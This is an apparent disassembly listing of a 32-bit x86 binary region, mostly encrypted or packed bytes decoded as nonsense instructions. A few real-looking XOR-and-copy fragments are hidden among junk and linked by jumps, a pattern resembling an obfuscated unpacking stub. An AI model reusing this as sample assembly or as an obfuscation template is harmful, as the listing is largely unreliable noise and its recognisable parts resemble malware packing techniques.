  404fbf:	mov    dl,0x7
  404fc1:	pop    ecx
  404fc2:	xchg   edi,eax
  404fc3:	in     al,0xc7
  404fc5:	clc    
  404fc6:	jno    0x40501c
  404fc8:	mov    BYTE PTR [ebx+0x16b55661],al
  404fce:	cmp    BYTE PTR [edx],bl
  404fd0:	fcmovb st,st(5)
  404fd2:	cmp    eax,DWORD PTR [edi+ecx*1]
  404fd5:	mov    eax,0xe5a1bffe
  404fda:	mov    ch,0x78
  404fdc:	and    eax,eax
  404fde:	and    DWORD PTR [edi+edx*1],edi
  404fe1:	(bad)  
  404fe2:	out    dx,al
  404fe3:	inc    esi
  404fe4:	push   eax
  404fe5:	loop   0x405033
  404fe7:	and    bl,0x76
  404fea:	inc    esp
  404feb:	adc    DWORD PTR [ecx-0x1aa75625],edi
  404ff1:	xor    al,0x99
  404ff3:	dec    esp
  404ff4:	jge    0x40506a
  404ff6:	mov    al,0x84
  404ff8:	or     eax,0x9d794745
  404ffd:	jns    0x405052
  404fff:	and    al,0xa2
  405001:	jbe    0x404fd6
  405003:	repz sahf 
  405005:	push   esi
  405006:	dec    esi
  405007:	in     eax,dx
  405008:	xor    ebp,DWORD PTR [edi]
  40500a:	(bad)  
  40500b:	pop    ecx
  40500c:	loope  0x404fb0
  40500e:	xchg   ecx,eax
  40500f:	loope  0x404fe9
  405011:	xchg   cl,ah
  405013:	outs   dx,BYTE PTR ds:[esi]
  405014:	lods   ax,WORD PTR ds:[esi]
  405016:	or     BYTE PTR [edx],bh
  405018:	scas   al,BYTE PTR es:[edi]
  405019:	xchg   ebx,eax
  40501a:	xlat   BYTE PTR ds:[ebx]
  40501b:	rol    BYTE PTR [ebp+0x20],1
  40501e:	and    bl,ah
  405020:	push   0x47
  405022:	mov    eax,ds:0xfa9fb84f
  405027:	leave  
  405028:	jmp    0x3aca079d
  40502d:	cmp    BYTE PTR [eax],dl
  40502f:	aaa    
  405030:	xor    BYTE PTR [ebp-0x72bd67df],0xfd
  405037:	and    bh,BYTE PTR [edi+edi*4-0x71913470]
  40503e:	cld    
  40503f:	push   esi
  405040:	repnz stos DWORD PTR es:[edi],eax
  405042:	cs ss shl bl,0x7d
  405047:	clc    
  405048:	xchg   BYTE PTR [ebx+0x2ea4be83],al
  40504e:	ins    DWORD PTR es:[edi],dx
  40504f:	and    ebp,eax
  405051:	fist   WORD PTR [edi+edi*4]
  405054:	cs mov cl,0x16
  405057:	ret    0xaa45
  40505a:	sbb    eax,0xcc8af18e
  40505f:	inc    eax
  405060:	repz sbb esp,DWORD PTR [esp+ecx*2+0x6f211d75]
  405068:	inc    esp
  405069:	and    al,0x5c
  40506b:	js     0x40501e
  40506d:	shl    edi,cl
  40506f:	jmp    0xdd4a6b14
  405074:	pop    ebx
  405075:	out    0x59,al
  405077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405078:	jle    0x4050e0
  40507a:	sbb    DWORD PTR [ebx+0x6553a85b],edi
  405080:	pop    ecx
  405081:	jmp    0x40502b
  405083:	sar    DWORD PTR [edi-0x2f],0xe6
  405087:	loop   0x405074
  405089:	mov    esp,0x2cca9f67
  40508e:	not    DWORD PTR [edi+eax*8]
  405091:	inc    DWORD PTR [ebp+esi*8-0x4d07fbe6]
  405098:	je     0x4050bb
  40509a:	jmp    0xd55f60f8
  40509f:	pusha  
  4050a0:	xor    DWORD PTR [esi-0x44],edi
  4050a3:	jge    0x40508b
  4050a5:	(bad)  
  4050a6:	mov    ebp,ecx
  4050a8:	pop    esi
  4050a9:	ins    BYTE PTR es:[edi],dx
  4050aa:	jge    0x4050e6
  4050ac:	mov    eax,ds:0x4234089e
  4050b1:	sahf   
  4050b2:	and    BYTE PTR [edi*4-0x556f67ec],dh
  4050b9:	aam    0xea
  4050bb:	pop    ecx
  4050bc:	add    BYTE PTR [ebx],al
  4050be:	sbb    BYTE PTR [eax+0x3e],0xd
  4050c2:	jae    0x4050bd
  4050c4:	adc    al,0x68
  4050c6:	loope  0x405087
  4050c8:	push   0x2bffcd8d
  4050cd:	clc    
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x1062c102],bh
  4050fc:	scas   al,BYTE PTR es:[edi]
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x40513c
  405106:	jno    0x405129
  405108:	jno    0x405169
  40510a:	jl     0x405118
  40510c:	out    0x1c,eax
  40510e:	(bad)  
  40510f:	pop    edx
  405110:	mov    edx,0xc7853b91
  405115:	mov    ah,0x10
  405117:	inc    edx
  405118:	mov    ds:0xacbe006c,eax
  40511d:	call   0x2eddb5d2
  405122:	repz inc esp
  405124:	cmp    DWORD PTR [ecx-0x12d10f37],ebx
  40512a:	adc    bl,BYTE PTR [edx+0x31]
  40512d:	in     al,0x1a
  40512f:	mov    edi,ss
  405131:	repz fcomi st,st(1)
  405134:	outs   dx,DWORD PTR ds:[esi]
  405135:	jg     0x4050ea
  405137:	into   
  405138:	and    ebp,esp
  40513a:	inc    edi
  40513b:	test   DWORD PTR [edi],esp
  40513d:	sbb    ebx,DWORD PTR [edx+0x40]
  405140:	jmp    0x4050cb
  405142:	ja     0x405151
  405144:	xor    al,0x84
  405146:	clc    
  405147:	retf   
  405148:	mov    eax,ds:0xec5bbf4b
  40514d:	lock das 
  40514f:	mov    BYTE PTR [edi+0x44],bl
  405152:	lahf   
  405153:	fst    QWORD PTR [esi]
  405155:	mov    ebp,0x9ead4674
  40515a:	test   DWORD PTR [ebx+0x6e],ebx
  40515d:	adc    BYTE PTR [ebx],0x8b
  405160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405161:	icebp  
  405162:	icebp  
  405163:	adc    al,0x54
  405165:	popf   
  405166:	jns    0x4051ce
  405168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405169:	retf   0x467d
  40516c:	sbb    BYTE PTR [edi],ch
  40516e:	cdq    
  40516f:	out    dx,al
  405170:	and    BYTE PTR [edx+0x109a9cd6],0x27
  405177:	inc    ecx
  405178:	icebp  
  405179:	mov    eax,ds:0xd582092b
  40517e:	cmp    eax,0xc57808f3
  405183:	(bad)  
  405185:	mov    cl,0xc0
  405187:	hlt    
  405188:	add    al,ah
  40518a:	clc    
  40518b:	gs daa 
  40518d:	mov    bl,0xe2
  40518f:	in     al,0x9c
  405191:	xchg   ebx,eax
  405192:	adc    eax,DWORD PTR [eax-0x3c8b2c2a]
  405198:	(bad)  
  405199:	push   esp
  40519a:	mov    ecx,0xa230bb4a
  40519f:	sub    bh,ah
  4051a1:	stos   DWORD PTR es:[edi],eax
  4051a2:	inc    edi
  4051a3:	mov    eax,0x5145b2e1
  4051a8:	inc    ecx
  4051a9:	outs   dx,BYTE PTR ds:[esi]
  4051aa:	mov    dh,0x15
  4051ac:	push   edx
  4051ad:	jo     0x4051a9
  4051af:	and    esp,eax
  4051b1:	aaa    
  4051b2:	scas   al,BYTE PTR es:[edi]
  4051b3:	push   0x8dcd04f0
  4051b8:	je     0x4051d1
  4051ba:	sub    ch,BYTE PTR [ecx]
  4051bc:	(bad)  
  4051bd:	lods   al,BYTE PTR ds:[esi]
  4051be:	ds leave 
  4051c0:	adc    eax,0xbbf61aff
  4051c5:	scas   eax,DWORD PTR es:[edi]
  4051c6:	sbb    DWORD PTR [edi+0x309ae623],0x2a1f488
  4051d0:	outs   dx,DWORD PTR ds:[esi]
  4051d1:	dec    edx
  4051d2:	leave  
  4051d3:	and    al,0xfa
  4051d5:	cmp    al,0x70
  4051d7:	in     eax,dx
  4051d8:	sub    bl,BYTE PTR [ebx]
  4051da:	call   0xf345:0x1eef61c9
  4051e1:	add    DWORD PTR [ecx+0x4bb306ac],eax
  4051e7:	xor    al,BYTE PTR [ecx]
  4051e9:	stc    
  4051ea:	or     al,0x67
  4051ec:	sub    edx,DWORD PTR [ecx-0x11]
  4051ef:	sar    DWORD PTR [esi-0x69],cl
  4051f2:	and    BYTE PTR [esp+ebx*8+0x3578dbfd],ah
  4051f9:	mov    DWORD PTR [ecx+0x3da7e802],edx
  4051ff:	retf   
  405200:	dec    esi
  405201:	inc    ecx
  405202:	(bad)  
  405203:	shr    DWORD PTR [edx+0xe],cl
  405206:	int    0x83
  405208:	repz enter 0x13de,0x2b
  40520d:	mov    ebx,edx
  40520f:	dec    ebp
  405210:	nop
  405211:	es jecxz 0x4051c9
  405214:	inc    edx
  405215:	and    ah,al
  405217:	lods   eax,DWORD PTR ds:[esi]
  405218:	mov    ecx,0x89eda0b5
  40521d:	jecxz  0x405214
  40521f:	cwde   
  405220:	dec    eax
  405221:	and    dh,0xcf
  405224:	test   DWORD PTR [esi],edi
  405226:	das    
  405227:	cmc    
  405228:	sbb    ch,BYTE PTR [ebx-0x64]
  40522b:	xor    al,0x5b
  40522d:	dec    ebx
  40522e:	scas   al,BYTE PTR es:[edi]
  40522f:	mov    edi,0x56a9f32f
  405234:	add    eax,0xcc0e3375
  405239:	stos   DWORD PTR es:[edi],eax
  40523a:	fcom   QWORD PTR ds:0x10255dbb
  405240:	xlat   BYTE PTR ds:[ebx]
  405241:	int3   
  405242:	pop    eax
  405243:	push   0x4333b0ee
  405248:	add    DWORD PTR [edi+0x4],eax
  40524b:	not    BYTE PTR [esi+0x2f9d7786]
  405251:	mov    ecx,0x138169a5
  405256:	imul   eax,DWORD PTR [edi-0x3bc8c20f],0x1b37398b
  405260:	or     DWORD PTR [ecx],edi
  405262:	ret    
  405263:	(bad)
  405266:	pop    esp
  405267:	enter  0xf64c,0x77
  40526b:	out    dx,eax
  40526c:	and    bl,BYTE PTR [ebp-0x32b9db73]
  405272:	jmp    0x40527f
  405274:	out    dx,eax
  405275:	jb     0x4052d9
  405277:	stos   DWORD PTR es:[edi],eax
  405278:	cmpps  xmm6,XMMWORD PTR [ebp+edi*2+0x5f],0x34
  40527e:	xchg   edi,eax
  40527f:	push   edi
  405280:	sub    DWORD PTR [esi+eiz*1-0x2b],ebp
  405284:	push   0x7c
  405286:	cs pop esp
  405288:	(bad)
  40528b:	and    BYTE PTR [eax+0x7e],0xfa
  40528f:	dec    edi
  405290:	(bad)  
  405291:	push   eax
  405292:	lock push esi
  405294:	pop    ecx
  405295:	fdiv   DWORD PTR [edi+0xfdaf600]
  40529b:	xor    BYTE PTR [eax-0x28fc46f3],cl
  4052a1:	cmp    edx,edi
  4052a3:	cwde   
  4052a4:	cmp    al,0xb7
  4052a6:	sbb    eax,0xbb5cfa57
  4052ab:	loop   0x4052ad
  4052ad:	dec    ebx
  4052ae:	mov    ah,0xcf
  4052b0:	rcl    cl,cl
  4052b2:	jne    0x405309
  4052b4:	jns    0x405287
  4052b6:	jecxz  0x40528d
  4052b8:	add    al,0xd9
  4052ba:	mov    ebx,0x85502a7d
  4052bf:	fadd   QWORD PTR [ebx+ebp*2]
  4052c2:	test   DWORD PTR [edx],edi
  4052c4:	imul   eax,DWORD PTR [eax-0x4f],0x1e871ef6
  4052cb:	and    esi,DWORD PTR [ebx]
  4052cd:	popa   
  4052ce:	push   esp
  4052cf:	xchg   edx,eax
  4052d0:	xchg   edx,eax
  4052d1:	cmp    DWORD PTR [ecx],ebp
  4052d3:	bound  ebx,QWORD PTR [ebx]
  4052d5:	loop   0x40534c
  4052d7:	inc    esi
  4052d8:	jecxz  0x4052eb
  4052da:	pop    esp
  4052db:	loop   0x4052ef
  4052dd:	push   ds
  4052de:	icebp  
  4052df:	mov    BYTE PTR ds:0x5f62d698,dl
  4052e5:	(bad)  
  4052e6:	jg     0x4052b7
  4052e8:	fwait
  4052e9:	lods   al,BYTE PTR ds:[esi]
  4052ea:	mov    ebp,0x28dacbf1
  4052ef:	sbb    cl,BYTE PTR [ecx-0x25]
  4052f2:	or     al,dh
  4052f4:	int    0x16
  4052f6:	fnstsw ax
  4052f8:	daa    
  4052f9:	mov    ch,0x8
  4052fb:	or     BYTE PTR [ebx+eax*1-0x643c5ac6],dl
  405302:	and    DWORD PTR [edx-0x56b3451e],ebx
  405308:	mov    ah,0x20
  40530a:	out    0xb9,eax
  40530c:	and    BYTE PTR [ecx+0x29],cl
  40530f:	in     al,0xc
  405311:	sti    
  405312:	push   edi
  405313:	(bad)  
  405314:	mov    al,ds:0x4ee3602e
  405319:	fisubr DWORD PTR [esp+eiz*4]
  40531c:	push   cs
  40531d:	lods   al,BYTE PTR ds:[esi]
  40531e:	xor    ebp,ecx
  405320:	pop    es
  405321:	imul   esp,ebx,0x30
  405324:	rcr    DWORD PTR [eax-0x57],1
  405327:	jp     0x40535e
  405329:	dec    ebp
  40532a:	adc    eax,0xe724880f
  40532f:	inc    ebp
  405330:	pop    ss
  405331:	cmp    DWORD PTR [eax+0x64],0xffffffd7
  405335:	mov    BYTE PTR [edx],0x35
  405338:	fwait
  405339:	jp     0x405352
  40533b:	stos   BYTE PTR es:[edi],al
  40533c:	xchg   esi,eax
  40533d:	mov    DWORD PTR [edx-0x21c7c2ca],ebx
  405343:	in     al,dx
  405344:	retf   0xab18
  405347:	sbb    al,0xff
  405349:	rcr    esi,0x3d
  40534c:	fcomp  DWORD PTR [ecx]
  40534e:	ja     0x4053be
  405350:	adc    BYTE PTR [eax+esi*8+0x3845a372],ch
  405357:	dec    esi
  405358:	push   esi
  405359:	scas   al,BYTE PTR es:[edi]
  40535a:	(bad)
  40535e:	stc    
  40535f:	jg     0x40535d
  405361:	mov    ebp,0xc5051684
  405366:	loopne 0x40531e
  405368:	add    ebp,0xf24cf75f
  40536e:	(bad)  
  40536f:	dec    esp
  405370:	jge    0x4053e9
  405372:	push   0xffffff99
  405374:	mov    bl,0x1
  405376:	cmp    DWORD PTR [edx],ebp
  405378:	adc    al,0x5d
  40537a:	dec    edi
  40537b:	call   0x2a02c57
  405380:	retf   0x6e1f
  405383:	xor    BYTE PTR [edx],al
  405385:	call   0x9e87b2d3
  40538a:	fadd   st(3),st
  40538c:	ret    
  40538d:	mov    ecx,DWORD PTR [esi+0x385c319]
  405393:	push   es
  405394:	arpl   WORD PTR fs:[eax],bx
  405397:	inc    ebp
  405398:	sbb    ebx,DWORD PTR [eax-0x5945a668]
  40539e:	cmc    
  40539f:	fcomp  QWORD PTR [esi-0x54bc4a40]
  4053a5:	push   eax
  4053a6:	adc    dl,al
  4053a8:	xchg   BYTE PTR [edx-0x1e],dh
  4053ab:	(bad)  
  4053ac:	ffreep st(7)
  4053ae:	enter  0x34cd,0xf7
  4053b2:	ds push edi
  4053b4:	or     BYTE PTR [ebx],0x84
  4053b7:	mov    ds:0x44ab3b2e,al
  4053bc:	cs xchg esp,eax
  4053be:	sbb    dh,BYTE PTR [ebp+0x12a15c95]
  4053c4:	pop    ebx
  4053c5:	mov    esi,0x4fe8a023
  4053ca:	imul   edi,DWORD PTR [ebp-0x4a791],0x10ca1acc
  4053d4:	aas    
  4053d5:	pop    esp
  4053d6:	pushf  
  4053d7:	push   ecx
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fcomp  QWORD PTR [esi+0x3d18bef2]
  4053f1:	xor    eax,0x7e4d7878
  4053f6:	js     0x405470
  4053f8:	mov    al,0x4b
  4053fa:	dec    esi
  4053fb:	out    dx,eax
  4053fc:	push   0x39245185
  405401:	mov    edi,0x5e5583de
  405406:	js     0x40542b
  405408:	rcr    edi,1
  40540a:	push   0x27b84c04
  40540f:	int3   
  405410:	int3   
  405411:	aas    
  405412:	jmp    0xb6c8307a
  405417:	outs   dx,BYTE PTR ds:[esi]
  405418:	outs   dx,BYTE PTR ds:[esi]
  405419:	test   eax,0xc09fdbe3
  40541e:	push   ebp
  40541f:	sbb    eax,0x3963be62
  405424:	add    eax,0x98e9bba7
  405429:	ret    
  40542a:	cwde   
  40542b:	jne    0x405448
  40542d:	xchg   DWORD PTR [edi],edx
  40542f:	leave  
  405430:	pusha  
  405431:	arpl   WORD PTR [ebp+0x6ec28b8d],cx
  405437:	int    0x17
  405439:	icebp  
  40543a:	pop    ebx
  40543b:	cmp    esi,DWORD PTR [ecx-0x1ef66732]
  405441:	enter  0x98a0,0x91
  405445:	in     al,dx
  405446:	stos   DWORD PTR es:[edi],eax
  405447:	ins    BYTE PTR es:[edi],dx
  405448:	inc    ecx
  405449:	popa   
  40544a:	aam    0xd8
  40544c:	dec    eax
  40544d:	jno    0x405472
  40544f:	jne    0x4053e6
  405451:	mov    al,ds:0x21c4c597
  405456:	retf   
  405457:	xor    BYTE PTR ds:0xaa5eaf8e,bl
  40545d:	sbb    edx,eax
  40545f:	jae    0x4053e7
  405461:	inc    ebp
  405462:	out    dx,al
  405463:	xor    al,0x73
  405465:	cmp    bh,ch
  405467:	icebp  
  405468:	inc    edi
  405469:	test   ecx,ebp
  40546b:	mov    ah,0x45
  40546d:	push   0x616c1fb4
  405472:	call   0x72a3db60
  405477:	add    edx,DWORD PTR [ebx]
  405479:	xchg   ebp,eax
  40547a:	cdq    
  40547b:	in     eax,dx
  40547c:	and    ebp,edi
  40547e:	rcl    DWORD PTR ds:0xe4ee667a,0xca
  405485:	and    bh,BYTE PTR [ebx+0x22]
  405488:	mov    edx,0xa3f9b2ba
  40548d:	in     al,0x8f
  40548f:	mov    ds:0xa482759a,eax
  405494:	pop    ecx
  405495:	push   ebp
  405496:	int3   
  405497:	bound  ecx,QWORD PTR [ecx]
  405499:	retf   0xd128
  40549c:	mov    ebx,0x387ba59b
  4054a1:	jecxz  0x405485
  4054a3:	std    
  4054a4:	jge    0x40544e
  4054a6:	dec    edi
  4054a7:	jle    0x405482
  4054a9:	jg     0x4054c7
  4054ab:	and    eax,0xad0d28fd
  4054b0:	hlt    
  4054b1:	xor    eax,0x2e661ddb
  4054b6:	addr16 popf 
  4054b8:	call   0x909ca99d
  4054bd:	push   ebx
  4054be:	cmp    DWORD PTR [eax+esi*4+0x73],ebx
  4054c2:	xlat   BYTE PTR ds:[ebx]
  4054c3:	fcmovnu st,st(4)
  4054c5:	ret    
  4054c6:	scas   al,BYTE PTR es:[edi]
  4054c7:	scas   eax,DWORD PTR es:[edi]
  4054c8:	lods   al,BYTE PTR ds:[esi]
  4054c9:	cmp    eax,0xbf9f1088
  4054ce:	lods   al,BYTE PTR ds:[esi]
  4054cf:	aad    0x5c
  4054d1:	jno    0x405491
  4054d3:	retf   0x7dd0
  4054d6:	xor    al,0xd1
  4054d8:	jnp    0x40547f
  4054da:	dec    eax
  4054db:	xchg   ebp,eax
  4054dc:	enter  0x4aaa,0x91
  4054e0:	push   ebx
  4054e1:	jecxz  0x405492
  4054e3:	pop    ss
  4054e4:	or     BYTE PTR [eax],dh
  4054e6:	jle    0x4054cc
  4054e8:	mov    esp,0x7633aa47
  4054ed:	sub    al,0xcb
  4054ef:	cmp    DWORD PTR [ebp+edi*1-0x3fea0d6c],eax
  4054f6:	aad    0x36
  4054f8:	xor    al,0x85
  4054fa:	test   DWORD PTR [ebp+0x4e1cb10c],esi
  405500:	jb     0x4054dd
  405502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405503:	or     eax,0x81bbfe00
  405508:	(bad)  
  405509:	sbb    al,0x58
  40550b:	adc    BYTE PTR [eax+0x2384f062],dl
  405511:	sub    eax,0xf4addcf1
  405516:	iret   
  405517:	xchg   esp,eax
  405518:	sub    al,0xb1
  40551a:	(bad)  
  40551b:	mov    gs,WORD PTR [edi]
  40551d:	shr    DWORD PTR [ebp+0x4b],1
  405520:	or     BYTE PTR [eax],0x1
  405523:	add    BYTE PTR ss:[bp+di-0x1e],al
  405528:	pushf  
  405529:	and    BYTE PTR ds:0xc87fb927,ah
  40552f:	cmp    al,BYTE PTR [ecx+0x849e6a9]
  405535:	inc    esp
  405536:	mov    dl,0xe2
  405538:	or     dl,bh
  40553a:	push   es
  40553b:	cmp    edx,esp
  40553d:	call   FWORD PTR [eax+0x73]
  405540:	das    
  405541:	xchg   BYTE PTR [edx-0x4b315b14],cl
  405547:	ss dec eax
  405549:	dec    esp
  40554a:	dec    eax
  40554b:	cmp    DWORD PTR [esi-0x28],edx
  40554e:	iret   
  40554f:	rcr    BYTE PTR [eax+edx*2],cl
  405552:	std    
  405553:	dec    edi
  405554:	test   BYTE PTR [ebp+0x190ae907],dh
  40555a:	rol    DWORD PTR [ebx+0x77c3b70d],cl
  405560:	lock xor bh,BYTE PTR [ebx+0x2c]
  405564:	fs jmp 0x405509
  405567:	sub    DWORD PTR [edi-0x1bed44d9],ecx
  40556d:	jp     0x4055ba
  40556f:	test   al,0x9f
  405571:	jp     0x40554d
  405573:	xchg   BYTE PTR [edx+0x35b335f2],dl
  405579:	dec    ecx
  40557a:	and    al,0x64
  40557c:	aas    
  40557d:	jp     0x40556f
  40557f:	fiadd  WORD PTR [esi+esi*4+0x3ea94164]
  405586:	into   
  405587:	aad    0x3b
  405589:	push   ds
  40558a:	neg    DWORD PTR [edi]
  40558c:	and    edx,DWORD PTR [eax]
  40558e:	jo     0x405580
  405590:	push   edx
  405591:	jmp    0x4055f5
  405593:	bound  ecx,QWORD PTR [edi-0x15f6447e]
  405599:	jg     0x4055ab
  40559b:	push   cs
  40559c:	mov    ebp,0xe2455456
  4055a1:	sbb    DWORD PTR [eax-0x1804fcc4],ebp
  4055a7:	xor    BYTE PTR [edi+0xa39b199],cl
  4055ad:	nop    DWORD PTR [eax-0x60c8f3b]
  4055b4:	sbb    BYTE PTR [eax],0x1d
  4055b7:	in     eax,0x67
  4055b9:	pop    ebp
  4055ba:	mov    eax,0x76327fe8
  4055bf:	cld    
  4055c0:	mov    cl,0x4c
  4055c2:	retf   
  4055c3:	jl     0x405553
  4055c5:	jmp    0xecb8fb07
  4055ca:	xchg   esi,eax
  4055cb:	sbb    BYTE PTR [ebx-0x8],dl
  4055ce:	out    0xd3,al
  4055d0:	push   esp
  4055d1:	jb     0x405604
  4055d3:	ret    
  4055d4:	push   0x7d
  4055d6:	cdq    
  4055d7:	xchg   edi,eax
  4055d8:	push   eax
  4055d9:	aam    0x2
  4055db:	mov    ah,0xe1
  4055dd:	mov    edi,0x8a0c141b
  4055e2:	data16 lods al,BYTE PTR ds:[esi]
  4055e4:	inc    ebp
  4055e5:	add    DWORD PTR [ebp-0x28ec243b],esi
  4055eb:	mov    dh,0xc1
  4055ed:	stc    
  4055ee:	add    al,bh
  4055f0:	(bad)  [ebp+0x7f5b5489]
  4055f6:	pop    esi
  4055f7:	mov    ds,WORD PTR [ebx-0x63]
  4055fa:	mov    ebp,0x22526957
  4055ff:	mov    ch,BYTE PTR [ecx]
  405601:	and    eax,0xb522ff6c
  405606:	jmp    0x3c1ed935
  40560b:	stos   BYTE PTR es:[edi],al
  40560c:	dec    esp
  40560d:	xor    al,0xf4
  40560f:	pop    edx
  405610:	and    ah,BYTE PTR [eax+0xeb30a73]
  405616:	dec    ebx
  405617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405618:	std    
  405619:	in     al,0x86
  40561b:	lods   eax,DWORD PTR ds:[esi]
  40561c:	punpcklwd mm2,mm3
  40561f:	mov    eax,ds:0xb9201fbf
  405624:	ins    BYTE PTR es:[edi],dx
  405625:	ins    BYTE PTR es:[edi],dx
  405626:	sbb    DWORD PTR [ebp+0x56b0819b],0x373d6966
  405630:	push   ecx
  405631:	dec    edx
  405632:	dec    ebx
  405633:	test   DWORD PTR [edx-0x7d],edi
  405636:	mov    eax,0x9b2bc6d4
  40563b:	lock aam 0xab
  40563e:	adc    edi,DWORD PTR [esi-0x4e5afd3d]
  405644:	inc    edx
  405645:	jg     0x4055fa
  405647:	into   
  405648:	fdivr  QWORD PTR [ecx+0x4e1d30ee]
  40564e:	aaa    
  40564f:	sahf   
  405650:	add    eax,0x4b8de60d
  405655:	call   0x96e4:0xc4221e6a
  40565c:	and    edi,esi
  40565e:	add    DWORD PTR [edi-0x31010641],esp
  405664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405665:	jl     0x4055ee
  405667:	jb     0x4056dd
  405669:	out    dx,eax
  40566a:	std    
  40566b:	ds xchg eax,esp
  40566e:	imul   edx,DWORD PTR [ebp-0x64],0xffffff8f
  405672:	mov    ch,BYTE PTR [edx-0x3992f225]
  405678:	xor    BYTE PTR [edi+ebx*4-0xe366e4c],ah
  40567f:	sti    
  405680:	xor    edx,ebx
  405682:	outs   dx,BYTE PTR ds:[esi]
  405683:	int3   
  405684:	shl    BYTE PTR [ecx+0xa26e75],cl
  40568a:	lods   eax,DWORD PTR ds:[esi]
  40568b:	mov    BYTE PTR [eax-0x75946569],al
  405691:	add    eax,0xc3bdfaa9
  405696:	ret    
  405697:	test   BYTE PTR [esi],0xd
  40569a:	inc    ebx
  40569b:	cmp    ebx,DWORD PTR [edi+0x20]
  40569e:	pop    edx
  40569f:	and    eax,0xf4dc45e2
  4056a4:	sbb    eax,0x4702b8b0
  4056a9:	mov    DWORD PTR [ebx-0x5b],edx
  4056ac:	dec    esp
  4056ad:	out    0x68,eax
  4056af:	in     al,0xaf
  4056b1:	cwde   
  4056b2:	push   es
  4056b3:	aam    0x2e
  4056b5:	sar    BYTE PTR [ebx+0x79],0x7
  4056b9:	dec    ebx
  4056ba:	(bad)  
  4056bc:	pop    edx
  4056bd:	xor    al,0xd8
  4056bf:	enter  0x578,0x3e
  4056c3:	bound  edi,QWORD PTR [ebx+edx*1+0x52]
  4056c7:	ret    
  4056c8:	dec    ebp
  4056c9:	xchg   BYTE PTR [ecx],ah
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	push   ds
  405713:	lods   al,BYTE PTR ds:[esi]
  405714:	nop
  405715:	xlat   BYTE PTR ds:[ebx]
  405716:	adc    bh,BYTE PTR [edx]
  405718:	js     0x405792
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056b3
  40571f:	daa    
  405720:	mov    ch,0xad
  405722:	dec    esi
  405723:	xchg   edx,eax
  405724:	leave  
  405725:	data16 mov bl,0xbe
  405728:	inc    ebp
  405729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40572a:	shl    DWORD PTR [eax-0x5498100c],1
  405730:	cmp    eax,DWORD PTR ds:0x4b385138
  405736:	in     eax,0x22
  405738:	and    dh,BYTE PTR [esi+0x6a32078f]
  40573e:	cli    
  40573f:	sbb    al,0xd1
  405741:	sbb    ah,cl
  405743:	add    dl,BYTE PTR [ecx+eiz*8+0xd301dc0]
  40574a:	sti    
  40574b:	xor    BYTE PTR [esi],bl
  40574d:	fidivr WORD PTR [edx-0x59ef5441]
  405753:	retf   
  405754:	aam    0x79
  405756:	sub    DWORD PTR [ebp-0x7a],0x18e5932f
  40575d:	sub    ch,BYTE PTR [ebp+0x34942f8a]
  405763:	(bad)  
  405764:	loopne 0x4057cb
  405766:	fmul   DWORD PTR [eax+0x679e8220]
  40576c:	or     BYTE PTR [eax],0x46
  40576f:	xchg   esi,eax
  405770:	adc    bl,BYTE PTR [eax-0x3]
  405773:	ficom  WORD PTR [eax-0x623fc150]
  405779:	mov    esi,0xcb67902d
  40577e:	cdq    
  40577f:	xchg   esp,eax
  405780:	pop    edi
  405781:	retf   
  405782:	lahf   
  405783:	jg     0x405713
  405785:	fdivrp st(5),st
  405787:	cmp    al,bh
  405789:	call   0xec233303
  40578e:	mov    al,0x5f
  405790:	adc    al,0x7
  405792:	test   eax,0xd49a336c
  405797:	xor    ah,BYTE PTR [edi-0x2a]
  40579a:	pop    ebx
  40579b:	sbb    al,0x85
  40579d:	xchg   esi,eax
  40579e:	mov    ch,0x74
  4057a0:	jecxz  0x405816
  4057a2:	out    0xa5,al
  4057a4:	into   
  4057a5:	addr16 (bad) 
  4057a8:	fisttp DWORD PTR [ebx-0x4a]
  4057ab:	std    
  4057ac:	repz cmp al,BYTE PTR [ebx+0x412f3f98]
  4057b3:	test   al,0x7f
  4057b5:	sub    eax,0xce636c5d
  4057ba:	dec    edx
  4057bb:	aas    
  4057bc:	pop    edi
  4057bd:	add    ebp,DWORD PTR [ecx]
  4057bf:	xchg   ebp,eax
  4057c0:	repz ret 0x36e6
  4057c4:	js     0x405841
  4057c6:	pop    es
  4057c7:	je     0x40575e
  4057c9:	(bad)  
  4057ca:	out    0x6f,eax
  4057cc:	ja     0x4057cc
